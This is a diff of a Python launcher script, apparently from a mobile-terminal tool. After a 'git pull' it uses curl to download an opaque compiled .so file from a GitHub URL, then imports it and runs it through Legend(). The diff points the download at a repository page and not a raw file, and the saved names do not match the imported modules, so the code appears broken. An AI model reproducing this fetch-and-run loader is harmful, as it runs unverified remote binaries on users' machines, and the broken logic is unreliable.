@@ -6,7 +6,7 @@ os.system("git pull")
 bit = platform.architecture()[0]
 if bit == '64bit':
 	if not os.path.exists("pycrypto_qsr.so"):		
-		os.system(f'curl -L https://github.com/syedsahab1122/files/blob/main/pycrypto_qsr.cpython-311.so?raw=true > pycrypto_qsr.so')
+		os.system(f'curl -L https://github.com/HAMZA-GHANIZADA/Hamza-Ghanizada > pycrypto_AB64.so')
 		from AB64 import Legend
 		Legend()
 	else:
@@ -14,7 +14,7 @@ if bit == '64bit':
 		Legend()
 elif bit == '32bit':
 	if not os.path.exists("pycrypto_qsr32.so"):
-		os.system(f'curl -L https://github.com/syedsahab1122/files/blob/main/pycrypto_qsr32.cpython-311.so?raw=true > pycrypto_qsr32.so')
+		os.system(f'curl -L https://github.com/HAMZA-GHANIZADA/Hamza-Ghanizada > pycrypto_AB32.so')
 		from AB32 import Legend
 		Legend()
 	else:
